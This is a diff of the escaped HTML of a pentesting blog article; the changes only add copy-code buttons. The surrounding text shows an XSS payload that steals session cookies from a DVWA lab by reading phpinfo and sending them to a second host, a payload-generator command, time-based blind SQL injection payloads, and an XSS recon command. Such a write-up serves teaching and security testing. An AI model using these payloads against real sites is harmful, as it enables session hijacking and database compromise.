    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Initializes the request object&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reqListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Set the listener reqListener that is triggered when the response is ready&lt;/span&gt;
@@ -429,6 +546,12 @@ prompt
 
 &lt;p&gt;So if we set up a web server in our Kali through the above command, we write the payload&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reqListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.128/dvwa/phpinfo&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;withCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reqListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;HTTP_COOKIE&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.129/?data=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()};&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -441,6 +564,12 @@ prompt
 &lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/user-cookies-exfiltrated-decoded-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;As you can see, all the cookies has been displayed, so we have bypassed the &lt;em&gt;HttpOnly&lt;/em&gt; flag of the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie. Therefore, anyone who clicks on the URL&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.240.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Evar+req+%3D+new+XMLHttpRequest%28%29%3Breq.onload%3DreqListener%3Bvar+url%3D%22http%3A%2F%2F192.168.240.128%2Fdvwa%2Fphpinfo%22%3Breq.withCredentials%3Dtrue%3Breq.open%28%22GET%22%2Curl%2Cfalse%29%3Breq.send%28%29%3Bfunction+reqListener%28%29+%7Bvar+req2%3Dnew+XMLHttpRequest%28%29%3Bconst+sess%3Dthis.responseText.substring%28this.responseText.indexOf%28%22HTTP_COOKIE%22%29%29%3Breq2.open%28%22GET%22%2C%22http%3A%2F%2F192.168.240.129%2F%3Fdata%3D%22%2Bbtoa%28sess%29%2Cfalse%29%3Breq2.send%28%29%7D%3B%3C%2Fscript%3E#
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -461,10 +590,22 @@ prompt
 
 &lt;p&gt;To avoid repeating the same thing, if you want to know how the tool works you can see the README.md and you can give a star to the project :blush:. In this case, cloning the repo and running the following command&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;./generate-javascript-payload.sh http://192.168.240.128/dvwa/phpinfo.php http://192.168.240.129/
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;you will get the following XSS payload&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://192.168.240.128/dvwa/phpinfo.php&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;startString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td class=&quot;e&quot;&amp;gt;HTTP_COOKIE &amp;lt;/td&amp;gt;&amp;lt;td class=&quot;v&quot;&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;startIndex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endIndex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;endString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;endIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;encodedCookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://192.168.240.129/&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;?encodedCookies=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodedCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,{&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;});});&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -634,6 +775,12 @@ prompt
 
 &lt;p&gt;After a long time of testing MySQL payloads for different purposes such as login bypass, RCE… Finally the only one that worked was&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user&apos;+OR+(SELECT+SLEEP(0.02))=1#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -663,6 +810,12 @@ prompt
 
 &lt;p&gt;I don’t have the source code of the website but, I think that in the backend there was a MySQL query similar to this&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;nombre_usuario&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -670,20 +823,44 @@ prompt
 
 &lt;p&gt;If we enter a “non-malicious” user, such as&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;HackCommander
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;the query that will be executed is&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;HackCommander&apos;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;but if we enter a “malicious” user such as&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;HackCommander&apos; OR (SELECT SLEEP(0.02))=1#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;and &lt;strong&gt;the backend no sanitization is being applied in the input&lt;/strong&gt;, the query that will be executed is&lt;/p&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;HackCommander&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Here&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;would&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;be&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remaining&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -706,6 +883,12 @@ prompt
 
 &lt;p&gt;using the following payload&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;USER&apos;+OR+(SELECT+IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),&quot;NO&quot;))=1#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -723,6 +906,12 @@ prompt
   &lt;li&gt;The &lt;a href=&quot;https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/&quot;&gt;information_schema.tables&lt;/a&gt; is a view that allows to obtain information about all the views and tables of the database. Therefore, the following SQL code&lt;/li&gt;
 &lt;/ul&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;select+count(*)+from+information_schema.tables
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -731,6 +920,12 @@ prompt
 &lt;ul&gt;
   &lt;li&gt;The following SQL code&lt;/li&gt;
 &lt;/ul&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;(select+count(*)+from+information_schema.tables)=341
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -741,6 +936,12 @@ prompt
   &lt;li&gt;The following SQL code&lt;/li&gt;
 &lt;/ul&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),&quot;NO&quot;))
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -749,6 +950,12 @@ prompt
 &lt;ul&gt;
   &lt;li&gt;The above payload needs to be embedded into a SQL query so the following SQL code&lt;/li&gt;
 &lt;/ul&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
 
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;(SELECT+IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),&quot;NO&quot;))=1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -841,6 +1048,12 @@ prompt
 
 &lt;p&gt;I found this vulnerability through gau + kxss. If you are looking for XSS in the subdomain www.example.com, you can use the following command&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;gau www.example.com | kxss
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -868,12 +1081,24 @@ prompt
 
 &lt;p&gt;Suppose that the URL returned by gau + kxss is as follows&lt;/p&gt;
 
+&lt;div class=&quot;code-header&quot;&gt;
+  &lt;button class=&quot;copy-code-button&quot;&gt;
+    Copy code to clipboard
+  &lt;/button&gt;
+&lt;/div&gt;
+
